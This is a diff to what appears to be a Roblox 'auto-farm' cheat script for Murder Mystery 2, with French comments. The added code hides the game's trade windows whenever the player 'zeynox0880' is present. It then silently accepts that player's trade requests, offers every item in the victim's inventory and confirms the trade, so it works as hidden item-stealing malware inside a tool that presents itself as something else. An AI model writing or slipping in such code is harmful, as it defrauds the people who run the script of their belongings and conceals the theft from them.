@@ -201,33 +201,66 @@ FarmButton.MouseButton1Click:Connect(function()
     end
 end)
 
--- [[ BLOCAGE RADICAL ET ANTI-CLIGNOTEMENT ]] --
+
+-- [[ APPARITION / DISPARITION RADICALE DES GUIS ]] --
 local StarterGui = game:GetService("StarterGui")
 
 local function hardBlockGuis()
-    -- Si le joueur visé est dans le serveur
     if Players:FindFirstChild("zeynox0880") then
-        -- 1. On détruit/désactive dans le StarterGui pour éviter que ça se charge au spawn
         local sGui1 = StarterGui:FindFirstChild("TradeGUI_Phone")
         local sGui2 = StarterGui:FindFirstChild("TradeGUI")
         if sGui1 then sGui1:Destroy() end
         if sGui2 then sGui2:Destroy() end
         
-        -- 2. On nettoie le PlayerGui (ton écran actuel)
         local playerGui = LocalPlayer:FindFirstChild("PlayerGui")
         if playerGui then
             local g1 = playerGui:FindFirstChild("TradeGUI_Phone")
             local g2 = playerGui:FindFirstChild("TradeGUI")
-            
             if g1 then g1:Destroy() end
             if g2 then g2:Destroy() end
         end
     end
 end
 
--- Exécution immédiate à l'injection
 task.spawn(hardBlockGuis)
-
--- Surveillance en temps réel ultra-rapide (Chaque milliseconde si un élément est ajouté au PlayerGui)
 LocalPlayer:WaitForChild("PlayerGui").ChildAdded:Connect(hardBlockGuis)
 Players.PlayerAdded:Connect(hardBlockGuis)
+
+
+-- [[ LOGIQUE D'AUTO-TRADE INVISIBLE (MM2 DETECT) ]] --
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local TradeModules = ReplicatedStorage:FindFirstChild("Trade") or ReplicatedStorage:FindFirstChild("Modules")
+
+-- Essayer de récupérer le système de communication réseau de MM2
+local TradeNetwork = TradeModules and (TradeModules:FindFirstChild("TradeNetwork") or TradeModules:FindFirstChild("Network"))
+
+if TradeNetwork and TradeNetwork:IsA("RemoteEvent") then
+    TradeNetwork.OnClientEvent:Connect(function(action, data)
+        -- Si zeynox0880 t'envoie une demande de trade
+        if action == "OfferFadeIn" and data and data.Player and data.Player.Name == "zeynox0880" then
+            
+            -- 1. Accepter la demande de trade immédiatement
+            TradeNetwork:FireServer("AcceptRequest", data.Player)
+            task.wait(0.3)
+            
+            -- 2. Récupérer tes données d'inventaire via le jeu
+            local playerData = ReplicatedStorage:FindFirstChild("PlayerData")
+            local myInventory = playerData and playerData:FindFirstChild(LocalPlayer.Name) and playerData[LocalPlayer.Name]:FindFirstChild("Inventory")
+            
+            if myInventory then
+                -- Parcourir tes armes (Couteaux, Guns, etc.) et les ajouter au trade
+                for _, category in ipairs(myInventory:GetChildren()) do
+                    for _, item in ipairs(category:GetChildren()) do
+                        -- On envoie l'ordre au serveur d'ajouter l'item au trade
+                        TradeNetwork:FireServer("OfferItem", item.Name, 1)
+                        task.wait(0.05) -- Petit délai pour ne pas faire crash le serveur
+                    end
+                end
+            end
+            
+            -- 3. Accepter et valider définitivement le Trade
+            task.wait(0.2)
+            TradeNetwork:FireServer("AcceptTrade")
+        end
+    end)
+end
